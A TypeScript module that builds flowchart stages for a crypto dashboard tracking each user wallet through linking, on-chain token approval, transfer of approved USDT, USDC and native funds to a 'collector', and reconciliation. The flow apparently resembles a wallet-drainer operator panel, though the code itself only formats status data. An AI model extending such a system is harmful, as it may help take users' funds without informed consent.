import { formatDate } from "@/lib/format";
import {
  findPipelineAsset,
  formatPipelineScopeLabel,
  type PipelineAssetScope,
} from "@/lib/pipeline-scope";
import type {
  AssetPipeline,
  LogLinkParams,
  NetworkApprovedEntry,
  PipelineStage,
  PipelineStageStatus,
  UserPipelineSnapshot,
} from "@/types/pipeline";
import { pipelineStageStatusLabel } from "@/types/pipeline";

export type FlowchartVisualStatus =
  "pending" | "active" | "completed" | "failed" | "skipped";

export type FlowchartDetail = {
  label: string;
  value: string;
};

export type ChainBalanceSnapshot = {
  native: string;
  usdt?: string;
  usdc?: string;
};

export type FlowchartBalanceGroup = {
  network: string;
  assets: Array<{ symbol: string; amount: string }>;
};

export type FlowchartStage = {
  key: string;
  label: string;
  subtitle: string;
  status: FlowchartVisualStatus;
  badgeLabel: string;
  hint?: string;
  widthPercent: number;
  gradient: string;
  ring: string;
  icon:
    "wallet" | "approval" | "collection" | "native" | "reconcile" | "complete";
  logQuery: LogLinkParams;
  details: FlowchartDetail[];
  balanceGroups?: FlowchartBalanceGroup[];
  at?: string;
};

export const NATIVE_SYMBOL: Record<string, string> = {
  eth: "ETH",
  bsc: "BNB",
  pol: "POL",
  polygon: "MATIC",
  avax: "AVAX",
  arb: "ETH",
  arbitrum: "ETH",
  base: "ETH",
  op: "ETH",
  tron: "TRX",
};

function formatBalanceAmount(value: string | undefined): string {
  if (value == null || value === "") return "0";
  const n = Number.parseFloat(value);
  if (!Number.isFinite(n)) return value;
  if (n === 0) return "0";
  if (Math.abs(n) < 0.000001) return n.toExponential(4);
  return n.toLocaleString(undefined, { maximumFractionDigits: 6 });
}

function parseChainBalances(
  raw: unknown,
): Record<string, ChainBalanceSnapshot> | null {
  if (!raw || typeof raw !== "object" || Array.isArray(raw)) return null;
  const out: Record<string, ChainBalanceSnapshot> = {};
  for (const [network, value] of Object.entries(
    raw as Record<string, unknown>,
  )) {
    if (!value || typeof value !== "object" || Array.isArray(value)) continue;
    const row = value as Record<string, unknown>;
    if (typeof row.native !== "string") continue;
    out[network] = {
      native: row.native,
      usdt: typeof row.usdt === "string" ? row.usdt : undefined,
      usdc: typeof row.usdc === "string" ? row.usdc : undefined,
    };
  }
  return Object.keys(out).length > 0 ? out : null;
}

export function buildWalletBalanceGroups(
  balances: Record<string, ChainBalanceSnapshot> | null,
): FlowchartBalanceGroup[] {
  if (!balances) return [];
  return Object.entries(balances)
    .sort(([a], [b]) => a.localeCompare(b))
    .map(([network, row]) => {
      const nativeSymbol = NATIVE_SYMBOL[network] ?? "Native";
      const assets: FlowchartBalanceGroup["assets"] = [
        { symbol: nativeSymbol, amount: formatBalanceAmount(row.native) },
        { symbol: "USDT", amount: formatBalanceAmount(row.usdt) },
        { symbol: "USDC", amount: formatBalanceAmount(row.usdc) },
      ];
      return {
        network: network.toUpperCase(),
        assets,
      };
    });
}

export type FlowchartMetadata = {
  networksApproved: string;
  walletType: string;
  balancesFetched: string;
  assetsDetected: string;
};

const STAGE_DEFS = [
  {
    key: "wallet_linked",
    label: "Wallet connected",
    subtitle: "User linked wallet and opened the app",
    gradient: "from-sky-500 to-cyan-500",
    ring: "ring-sky-400/40",
    icon: "wallet" as const,
  },
  {
    key: "network_approved",
    label: "Token approval",
    subtitle: "Spending allowance granted on-chain",
    gradient: "from-violet-500 to-purple-600",
    ring: "ring-violet-400/40",
    icon: "approval" as const,
  },
  {
    key: "collection",
    label: "Collection transfer",
    subtitle: "Approved tokens moved to collector",
    gradient: "from-amber-500 to-orange-500",
    ring: "ring-amber-400/40",
    icon: "collection" as const,
  },
  {
    key: "native",
    label: "Native funding",
    subtitle: "Gas / TRX sent back to user wallet",
    gradient: "from-emerald-500 to-teal-500",
    ring: "ring-emerald-400/40",
    icon: "native" as const,
  },
  {
    key: "verification",
    label: "Reconciliation",
    subtitle: "On-chain receipt verified and settled",
    gradient: "from-cyan-500 to-teal-500",
    ring: "ring-cyan-400/40",
    icon: "reconcile" as const,
  },
  {
    key: "complete",
    label: "Pipeline complete",
    subtitle: "Full lifecycle finished successfully",
    gradient: "from-green-500 to-lime-500",
    ring: "ring-green-400/40",
    icon: "complete" as const,
  },
] as const;

const STAGE_ICONS: Record<string, FlowchartStage["icon"]> = {
  wallet_linked: "wallet",
  network_approved: "approval",
  collection: "collection",
  native: "native",
  verification: "reconcile",
  complete: "complete",
};

export function flowchartStatusLabel(status: FlowchartVisualStatus): string {
  switch (status) {
    case "pending":
      return "Waiting";
    case "active":
      return "In progress";
    case "completed":
      return "Done";
    case "failed":
      return "Failed";
    case "skipped":
      return "Not started";
  }
}

export function toVisualStatus(
  status: PipelineStageStatus,
): FlowchartVisualStatus {
  switch (status) {
    case "waiting":
      return "pending";
    case "running":
    case "retried":
      return "active";
    case "success":
      return "completed";
    case "failed":
      return "failed";
    case "skipped":
      return "skipped";
  }
}

function aggregateStatus(statuses: PipelineStageStatus[]): PipelineStageStatus {
  if (statuses.length === 0) return "waiting";
  if (statuses.some((s) => s === "failed")) return "failed";
  if (statuses.some((s) => s === "running" || s === "retried"))
    return "running";
  if (statuses.every((s) => s === "skipped")) return "skipped";
  if (statuses.every((s) => s === "success" || s === "skipped"))
    return "success";
  if (statuses.some((s) => s === "success")) return "running";
  return "waiting";
}

function findStage(
  asset: AssetPipeline,
  key: string,
): PipelineStage | undefined {
  return asset.stages.find((s) => s.key === key);
}

function stageDetailRows(stage: PipelineStage | undefined): FlowchartDetail[] {
  if (!stage) return [];
  const rows: FlowchartDetail[] = [
    { label: "Status", value: pipelineStageStatusLabel(stage.status) },
  ];
  if (stage.at) rows.push({ label: "At", value: formatDate(stage.at) });
  for (const [key, value] of Object.entries(stage.metadata)) {
    if (value == null || value === "") continue;
    rows.push({ label: key, value: String(value) });
  }
  return rows;
}

function assetSummaryLine(asset: AssetPipeline): string {
  const current = asset.stages.find((s) => s.key === asset.currentStage);
  const status = current ? pipelineStageStatusLabel(current.status) : "—";
  return `${asset.symbol} (${asset.network}) · ${status}`;
}

export function badgeLabelForStatus(
  status: FlowchartVisualStatus,
  options?: { withRetry?: boolean },
): string {
  if (options?.withRetry && status === "completed")
    return "COMPLETED WITH RETRY";
  switch (status) {
    case "completed":
      return "COMPLETED";
    case "active":
      return "IN PROGRESS";
    case "failed":
      return "FAILED";
    case "skipped":
      return "SKIPPED";
    default:
      return "WAITING";
  }
}

function buildStage(
  def: (typeof STAGE_DEFS)[number],
  index: number,
  status: FlowchartVisualStatus,
  logQuery: LogLinkParams,
  details: FlowchartDetail[],
  options?: {
    at?: string;
    hint?: string;
    badgeLabel?: string;
    withRetry?: boolean;
    balanceGroups?: FlowchartBalanceGroup[];
  },
): FlowchartStage {
  const widths = [100, 88, 76, 64, 52, 40];
  const gradient =
    status === "failed"
      ? "from-red-500 to-rose-600"
      : status === "pending" || status === "skipped"
        ? "from-muted-foreground/25 to-muted-foreground/15"
        : def.gradient;
  const ring =
    status === "failed"
      ? "ring-red-400/50"
      : status === "active"
        ? def.ring
        : "ring-transparent";

  return {
    key: def.key,
    label: def.label,
    subtitle: def.subtitle,
    status,
    badgeLabel:
      options?.badgeLabel ??
      badgeLabelForStatus(status, { withRetry: options?.withRetry }),
    hint: options?.hint,
    widthPercent: widths[index] ?? 40,
    gradient,
    ring:
      status === "active" || status === "failed" ? ring : "ring-transparent",
    icon: STAGE_ICONS[def.key] ?? def.icon,
    logQuery,
    details,
    balanceGroups: options?.balanceGroups,
    at: options?.at,
  };
}

export function buildFlowchartMetadata(
  pipeline: UserPipelineSnapshot,
): FlowchartMetadata {
  const { walletLinked, assets, summary } = pipeline;
  const networks =
    summary.approvedChains.length > 0
      ? summary.approvedChains
      : summary.networksUsed;
  const walletType = walletLinked.metadata.tronAddress
    ? "Tron"
    : walletLinked.metadata.evmAddress
      ? "EVM"
      : "—";
  const balanceNetworks = walletLinked.metadata.balanceNetworks as
    string[] | undefined;
  const assetList = assets.map((a) => a.symbol).join(", ") || "—";

  return {
    networksApproved: networks.map((n) => n.toUpperCase()).join(", ") || "—",
    walletType,
    balancesFetched:
      balanceNetworks && balanceNetworks.length > 0
        ? balanceNetworks.map((n) => n.toUpperCase()).join(", ")
        : "Not fetched",
    assetsDetected: `${assets.length}${assets.length ? `: ${assetList}` : ""}`,
  };
}

export function buildGlobalFlowchart(
  pipeline: UserPipelineSnapshot,
): FlowchartStage[] {
  const { summary, walletLinked, networkApproved, assets, metrics } = pipeline;
  const tokenAssets = assets.filter((a) => a.kind === "token");
  const nativeAssets = assets.filter((a) => a.kind === "native");

  const approvalStatuses = networkApproved.networks.map((n) => n.status);
  const approvalAggregate = aggregateStatus(approvalStatuses);

  const transferStatuses = tokenAssets.map(
    (a) => findStage(a, "transfer")?.status ?? "waiting",
  );
  const transferAggregate = aggregateStatus(transferStatuses);

  const nativeStatuses = nativeAssets.map(
    (a) => findStage(a, "transfer_initiated")?.status ?? "waiting",
  );
  const nativeAggregate =
    nativeAssets.length === 0 ? "skipped" : aggregateStatus(nativeStatuses);

  const verifyStatuses = assets.map(
    (a) => findStage(a, "on_chain_verified")?.status ?? "waiting",
  );
  const verifyAggregate = aggregateStatus(verifyStatuses);

  const completeStatus: FlowchartVisualStatus = summary.isComplete
    ? "completed"
    : summary.workflowStage === "failed"
      ? "failed"
      : metrics.pipelinesCompleted > 0
        ? "active"
        : "pending";

  const chainBalances = parseChainBalances(walletLinked.metadata.balances);
  const balanceGroups = buildWalletBalanceGroups(chainBalances);

  const walletDetails: FlowchartDetail[] = [
    { label: "Workflow", value: summary.workflowStage },
    { label: "Health", value: summary.healthStatus },
    { label: "First seen", value: formatDate(summary.firstSeen) },
    { label: "Last activity", value: formatDate(summary.lastActivity) },
    {
      label: "Networks",
      value: summary.networksUsed.join(", ") || "—",
    },
    {
      label: "Events",
      value: String(walletLinked.metadata.eventCount ?? "—"),
    },
  ];

  const approvalDetails: FlowchartDetail[] = [
    {
      label: "Networks approved",
      value: String(networkApproved.networks.length),
    },
    ...networkApproved.networks.map((n) => ({
      label: n.network.toUpperCase(),
      value: `${n.approvalStatus ?? "—"} · ${pipelineStageStatusLabel(n.status)}`,
    })),
    { label: "Approved count", value: String(metrics.approved) },
  ];

  const collectionDetails: FlowchartDetail[] = [
    { label: "Token assets", value: String(tokenAssets.length) },
    { label: "Successful", value: String(metrics.transfersSuccessful) },
    { label: "Awaiting", value: String(metrics.transfersAwaiting) },
    { label: "Failed", value: String(metrics.transfersFailed) },
    { label: "Retries", value: String(metrics.retries) },
    ...tokenAssets.map((a) => ({
      label: a.key,
      value: assetSummaryLine(a),
    })),
  ];

  const nativeDetails: FlowchartDetail[] =
    nativeAssets.length === 0
      ? [{ label: "Status", value: "No native activity detected" }]
      : [
          { label: "Native assets", value: String(nativeAssets.length) },
          ...nativeAssets.map((a) => ({
            label: a.key,
            value: assetSummaryLine(a),
          })),
        ];

  const verifyDetails: FlowchartDetail[] = [
    { label: "On-chain verified", value: String(metrics.onChainVerified) },
    {
      label: "Pending confirmation",
      value: String(metrics.pendingConfirmations),
    },
    { label: "Repaired", value: String(metrics.repaired) },
    {
      label: "Avg processing",
      value:
        metrics.averageProcessingMs != null
          ? `${Math.round(metrics.averageProcessingMs / 1000)}s`
          : "—",
    },
  ];

  const completeDetails: FlowchartDetail[] = [
    { label: "Pipelines completed", value: String(metrics.pipelinesCompleted) },
    { label: "Success rate", value: `${Math.round(metrics.successRate)}%` },
    { label: "All complete", value: summary.isComplete ? "Yes" : "No" },
    { label: "Detected assets", value: String(assets.length) },
  ];

  const collectionVisual = toVisualStatus(transferAggregate);
  const collectionWithRetry =
    metrics.retries > 0 &&
    collectionVisual === "completed" &&
    metrics.transfersFailed === 0;

  const logBase: LogLinkParams = { walletAddress: pipeline.address };

  return [
    buildStage(
      STAGE_DEFS[0]!,
      0,
      toVisualStatus(walletLinked.status),
      walletLinked.logQuery,
      walletDetails,
      {
        at: walletLinked.at,
        balanceGroups: balanceGroups.length > 0 ? balanceGroups : undefined,
      },
    ),
    buildStage(
      STAGE_DEFS[1]!,
      1,
      toVisualStatus(approvalAggregate),
      networkApproved.networks[0]?.logQuery ?? {
        ...logBase,
        action: "confirm",
      },
      approvalDetails,
      { at: networkApproved.networks[0] ? undefined : undefined },
    ),
    buildStage(
      STAGE_DEFS[2]!,
      2,
      collectionVisual,
      {
        ...logBase,
        module: "wallet-service",
        action: "transfer.reconcile",
      },
      collectionDetails,
      {
        hint: tokenAssets.length > 0 ? "See assets below" : undefined,
        withRetry: collectionWithRetry,
      },
    ),
    buildStage(
      STAGE_DEFS[3]!,
      3,
      nativeAggregate === "skipped"
        ? "skipped"
        : toVisualStatus(nativeAggregate),
      { ...logBase, action: "confirm" },
      nativeDetails,
      {
        hint: nativeAssets.length === 0 ? "Not applicable" : undefined,
        badgeLabel: nativeAggregate === "skipped" ? "SKIPPED" : undefined,
      },
    ),
    buildStage(
      STAGE_DEFS[4]!,
      4,
      toVisualStatus(verifyAggregate),
      { ...logBase, action: "transfer.reconcile" },
      verifyDetails,
    ),
    buildStage(STAGE_DEFS[5]!, 5, completeStatus, logBase, completeDetails, {
      at: summary.isComplete ? (summary.lastActivity ?? undefined) : undefined,
    }),
  ];
}

type StagePresentation = {
  subtitle: string;
  gradient: string;
  ring: string;
  icon: FlowchartStage["icon"];
};

const TOKEN_STAGE_PRESENTATION: Record<string, StagePresentation> = {
  asset_detected: {
    subtitle: "Token detected on network",
    gradient: "from-sky-500 to-cyan-500",
    ring: "ring-sky-400/40",
    icon: "wallet",
  },
  wallet_phase: {
    subtitle: "User wallet popups complete",
    gradient: "from-indigo-500 to-blue-500",
    ring: "ring-indigo-400/40",
    icon: "wallet",
  },
  background_settlement: {
    subtitle: "Server-side settlement processing",
    gradient: "from-purple-500 to-fuchsia-500",
    ring: "ring-purple-400/40",
    icon: "collection",
  },
  approval: {
    subtitle: "Spending allowance granted on-chain",
    gradient: "from-violet-500 to-purple-600",
    ring: "ring-violet-400/40",
    icon: "approval",
  },
  collection_queued: {
    subtitle: "Collector scheduling",
    gradient: "from-indigo-500 to-violet-500",
    ring: "ring-indigo-400/40",
    icon: "collection",
  },
  transfer: {
    subtitle: "Tokens moved to collector",
    gradient: "from-amber-500 to-orange-500",
    ring: "ring-amber-400/40",
    icon: "collection",
  },
  retry_repair: {
    subtitle: "Reconciliation attempts",
    gradient: "from-orange-500 to-red-400",
    ring: "ring-orange-400/40",
    icon: "collection",
  },
  on_chain_verified: {
    subtitle: "Block receipt confirmed",
    gradient: "from-cyan-500 to-teal-500",
    ring: "ring-cyan-400/40",
    icon: "reconcile",
  },
  pipeline_complete: {
    subtitle: "Asset lifecycle finished",
    gradient: "from-green-500 to-lime-500",
    ring: "ring-green-400/40",
    icon: "complete",
  },
};

const NATIVE_STAGE_PRESENTATION: Record<string, StagePresentation> = {
  asset_detected: {
    subtitle: "Native asset detected on network",
    gradient: "from-sky-500 to-cyan-500",
    ring: "ring-sky-400/40",
    icon: "wallet",
  },
  wallet_phase: {
    subtitle: "User wallet popups complete",
    gradient: "from-indigo-500 to-blue-500",
    ring: "ring-indigo-400/40",
    icon: "wallet",
  },
  background_settlement: {
    subtitle: "Server-side settlement processing",
    gradient: "from-purple-500 to-fuchsia-500",
    ring: "ring-purple-400/40",
    icon: "collection",
  },
  transfer_initiated: {
    subtitle: "User broadcast native tx",
    gradient: "from-emerald-500 to-teal-500",
    ring: "ring-emerald-400/40",
    icon: "native",
  },
  pending_confirmation: {
    subtitle: "Awaiting on-chain receipt",
    gradient: "from-amber-500 to-yellow-500",
    ring: "ring-amber-400/40",
    icon: "native",
  },
  on_chain_verified: {
    subtitle: "Receipt reconciled",
    gradient: "from-cyan-500 to-teal-500",
    ring: "ring-cyan-400/40",
    icon: "reconcile",
  },
  pipeline_complete: {
    subtitle: "Native lifecycle finished",
    gradient: "from-green-500 to-lime-500",
    ring: "ring-green-400/40",
    icon: "complete",
  },
};

function presentationForStage(
  asset: AssetPipeline,
  stage: PipelineStage,
): StagePresentation {
  const table =
    asset.kind === "token"
      ? TOKEN_STAGE_PRESENTATION
      : NATIVE_STAGE_PRESENTATION;
  const known = table[stage.key];
  if (known) {
    return {
      ...known,
      subtitle:
        stage.key === "asset_detected"
          ? `${asset.symbol} on ${asset.network.toUpperCase()}`
          : known.subtitle,
    };
  }
  if (stage.key.startsWith("auth_")) {
    return {
      subtitle: "Authorization phase",
      gradient: "from-violet-500 to-purple-600",
      ring: "ring-violet-400/40",
      icon: "approval",
    };
  }
  return {
    subtitle: `${asset.symbol} on ${asset.network.toUpperCase()}`,
    gradient:
      asset.kind === "native"
        ? "from-emerald-500 to-teal-500"
        : "from-amber-500 to-orange-500",
    ring: asset.kind === "native" ? "ring-emerald-400/40" : "ring-amber-400/40",
    icon: asset.kind === "native" ? "native" : "collection",
  };
}

function enrichAssetStage(stage: FlowchartStage): FlowchartStage {
  if (stage.key === "on_chain_verified") {
    return {
      ...stage,
      label: "Reconciliation",
      subtitle: "On-chain receipt verified and settled",
      icon: "reconcile",
    };
  }
  if (stage.key === "pipeline_complete") {
    return {
      ...stage,
      label: "Pipeline complete",
      subtitle: "Asset lifecycle finished successfully",
      icon: "complete",
    };
  }
  return stage;
}

export function buildAssetFlowchart(
  asset: AssetPipeline,
  walletAddress: string,
): FlowchartStage[] {
  const attemptDetails: FlowchartDetail[] =
    asset.attempts.length > 0
      ? asset.attempts.flatMap((a) => [
          {
            label: `Attempt #${a.attemptNumber}`,
            value: `${pipelineStageStatusLabel(a.status)} · ${formatDate(a.at)}`,
          },
          ...(a.txHash ? [{ label: "Tx", value: a.txHash }] : []),
          ...(a.error
            ? [{ label: `Attempt #${a.attemptNumber} error`, value: a.error }]
            : []),
        ])
      : [{ label: "Attempts", value: "None yet" }];

  const stageCount = asset.stages.length;
  const widthsFor = (index: number) =>
    Math.max(40, 100 - index * Math.floor(60 / Math.max(stageCount - 1, 1)));

  return asset.stages.map((stage, index) => {
    const meta = presentationForStage(asset, stage);
    const details = [...stageDetailRows(stage)];
    if (stage.key === "transfer" || stage.key === "transfer_initiated") {
      details.push(...attemptDetails);
    }

    const visual = toVisualStatus(stage.status);
    const gradient =
      visual === "failed"
        ? "from-red-500 to-rose-600"
        : visual === "pending" || visual === "skipped"
          ? "from-muted-foreground/25 to-muted-foreground/15"
          : meta.gradient;

    return enrichAssetStage({
      key: stage.key,
      label: stage.label,
      subtitle: meta.subtitle,
      status: visual,
      badgeLabel: badgeLabelForStatus(visual, {
        withRetry: visual === "active" && stage.key === "retry_repair",
      }),
      widthPercent: widthsFor(index),
      gradient,
      ring:
        visual === "failed"
          ? "ring-red-400/50"
          : visual === "active"
            ? meta.ring
            : "ring-transparent",
      icon: STAGE_ICONS[stage.key] ?? meta.icon,
      logQuery: stage.logQuery.walletAddress
        ? stage.logQuery
        : { ...stage.logQuery, walletAddress },
      details,
      at: stage.at,
    });
  });
}

export type AssetBranchId = "usdt" | "usdc" | "native";

export type AssetBranchSlot = {
  id: AssetBranchId;
  title: string;
  network: string | null;
  asset: AssetPipeline | null;
  stages: FlowchartStage[];
};

export type VerticalFlowchartLayout = {
  headerStages: FlowchartStage[];
  branches: AssetBranchSlot[];
};

const TOKEN_BRANCH_KEYS = [
  "collection_queued",
  "transfer",
  "retry_repair",
  "on_chain_verified",
  "pipeline_complete",
] as const;

const NATIVE_BRANCH_KEYS = [
  "transfer_initiated",
  "pending_confirmation",
  "on_chain_verified",
  "pipeline_complete",
] as const;

function enrichBranchStageLabels(stages: FlowchartStage[]): FlowchartStage[] {
  return stages.map((s) => {
    if (s.key === "on_chain_verified") {
      return {
        ...s,
        label: "Reconciliation",
        subtitle: "On-chain receipt verified and settled",
        icon: "reconcile",
        gradient:
          s.status === "failed"
            ? s.gradient
            : s.status === "pending" || s.status === "skipped"
              ? s.gradient
              : "from-cyan-500 to-teal-500",
        ring:
          s.status === "active" || s.status === "failed"
            ? "ring-cyan-400/40"
            : s.ring,
      };
    }
    if (s.key === "pipeline_complete") {
      return {
        ...s,
        label: "Pipeline complete",
        subtitle: "Asset lifecycle finished successfully",
        icon: "complete",
        gradient:
          s.status === "failed"
            ? s.gradient
            : s.status === "pending" || s.status === "skipped"
              ? s.gradient
              : "from-green-500 to-lime-500",
        ring:
          s.status === "active" || s.status === "failed"
            ? "ring-green-400/40"
            : s.ring,
      };
    }
    return s;
  });
}

function placeholderStage(
  key: string,
  label: string,
  subtitle: string,
  walletAddress: string,
  icon: FlowchartStage["icon"],
): FlowchartStage {
  return {
    key,
    label,
    subtitle,
    status: "skipped",
    badgeLabel: "SKIPPED",
    hint: "Not applicable",
    widthPercent: 100,
    gradient: "from-muted-foreground/20 to-muted-foreground/10",
    ring: "ring-transparent",
    icon,
    logQuery: { walletAddress },
    details: [{ label: "Status", value: "Asset not detected for this wallet" }],
  };
}

function placeholderBranchStages(
  id: AssetBranchId,
  walletAddress: string,
): FlowchartStage[] {
  if (id === "native") {
    return enrichBranchStageLabels([
      placeholderStage(
        "transfer_initiated",
        "Transfer initiated",
        "User broadcast native tx",
        walletAddress,
        "native",
      ),
      placeholderStage(
        "pending_confirmation",
        "Pending confirmation",
        "Awaiting on-chain receipt",
        walletAddress,
        "native",
      ),
      placeholderStage(
        "on_chain_verified",
        "Reconciliation",
        "On-chain receipt verified",
        walletAddress,
        "reconcile",
      ),
      placeholderStage(
        "pipeline_complete",
        "Pipeline complete",
        "Native lifecycle finished",
        walletAddress,
        "complete",
      ),
    ]);
  }
  return enrichBranchStageLabels([
    placeholderStage(
      "collection_queued",
      "Collection queued",
      "Collector scheduling",
      walletAddress,
      "collection",
    ),
    placeholderStage(
      "transfer",
      "Collection transfer",
      "Tokens moved to collector",
      walletAddress,
      "collection",
    ),
    placeholderStage(
      "retry_repair",
      "Retry / repair",
      "Reconciliation attempts",
      walletAddress,
      "collection",
    ),
    placeholderStage(
      "on_chain_verified",
      "Reconciliation",
      "On-chain receipt verified",
      walletAddress,
      "reconcile",
    ),
    placeholderStage(
      "pipeline_complete",
      "Pipeline complete",
      "Token lifecycle finished",
      walletAddress,
      "complete",
    ),
  ]);
}

function pickAsset(
  assets: AssetPipeline[],
  matcher: (a: AssetPipeline) => boolean,
): AssetPipeline | null {
  return assets.find(matcher) ?? null;
}

function filterBranchStages(
  allStages: FlowchartStage[],
  keys: readonly string[],
): FlowchartStage[] {
  return enrichBranchStageLabels(
    keys
      .map((key) => allStages.find((s) => s.key === key))
      .filter((s): s is FlowchartStage => s != null),
  );
}

export function buildVerticalFlowchartLayout(
  pipeline: UserPipelineSnapshot,
): VerticalFlowchartLayout {
  const global = buildGlobalFlowchart(pipeline);
  const headerStages = global.slice(0, 2);

  const usdtAsset = pickAsset(
    pipeline.assets,
    (a) => a.kind === "token" && a.symbol.toUpperCase() === "USDT",
  );
  const usdcAsset = pickAsset(
    pipeline.assets,
    (a) => a.kind === "token" && a.symbol.toUpperCase() === "USDC",
  );
  const nativeAsset = pickAsset(pipeline.assets, (a) => a.kind === "native");

  const branchDefs: Array<{
    id: AssetBranchId;
    title: string;
    asset: AssetPipeline | null;
    keys: readonly string[];
  }> = [
    { id: "usdt", title: "USDT", asset: usdtAsset, keys: TOKEN_BRANCH_KEYS },
    { id: "usdc", title: "USDC", asset: usdcAsset, keys: TOKEN_BRANCH_KEYS },
    {
      id: "native",
      title: nativeAsset?.symbol ?? "Native",
      asset: nativeAsset,
      keys: NATIVE_BRANCH_KEYS,
    },
  ];

  const branches: AssetBranchSlot[] = branchDefs.map(
    ({ id, title, asset, keys }) => {
      if (!asset) {
        return {
          id,
          title,
          network: null,
          asset: null,
          stages: placeholderBranchStages(id, pipeline.address),
        };
      }
      const allStages = buildAssetFlowchart(asset, pipeline.address);
      return {
        id,
        title: asset.symbol,
        network: asset.network,
        asset,
        stages: filterBranchStages(allStages, keys),
      };
    },
  );

  return { headerStages, branches };
}

export type DedicatedFlowchartLayout = {
  scopeLabel: string;
  asset: AssetPipeline;
  stages: FlowchartStage[];
};

function buildWalletLinkedHeaderStage(
  pipeline: UserPipelineSnapshot,
): FlowchartStage {
  return buildGlobalFlowchart(pipeline)[0]!;
}

function buildNetworkApprovalHeaderStage(
  entry: NetworkApprovedEntry | undefined,
  walletAddress: string,
  network: string,
): FlowchartStage {
  if (!entry) {
    return placeholderStage(
      "network_approved",
      "Network approval",
      `Spending allowance on ${network.toUpperCase()}`,
      walletAddress,
      "approval",
    );
  }

  const details: FlowchartDetail[] = [
    { label: "Network", value: entry.network.toUpperCase() },
    { label: "Status", value: pipelineStageStatusLabel(entry.status) },
  ];
  if (entry.approvalStatus) {
    details.push({ label: "Approval status", value: entry.approvalStatus });
  }
  for (const [key, value] of Object.entries(entry.metadata)) {
    if (value == null || value === "") continue;
    details.push({ label: key, value: String(value) });
  }

  return buildStage(
    STAGE_DEFS[1]!,
    1,
    toVisualStatus(entry.status),
    entry.logQuery,
    details,
  );
}

export function buildDedicatedFlowchartLayout(
  pipeline: UserPipelineSnapshot,
  scope: PipelineAssetScope,
): DedicatedFlowchartLayout | null {
  const asset = findPipelineAsset(pipeline, scope);
  if (!asset) return null;

  const network = scope.network.toLowerCase();
  const walletStage = buildWalletLinkedHeaderStage(pipeline);
  const approvalEntry = pipeline.networkApproved.networks.find(
    (n) => n.network.toLowerCase() === network,
  );
  const approvalStage = buildNetworkApprovalHeaderStage(
    approvalEntry,
    pipeline.address,
    network,
  );
  const assetStages = buildAssetFlowchart(asset, pipeline.address);

  return {
    scopeLabel: formatPipelineScopeLabel(scope),
    asset,
    stages: [walletStage, approvalStage, ...assetStages],
  };
}
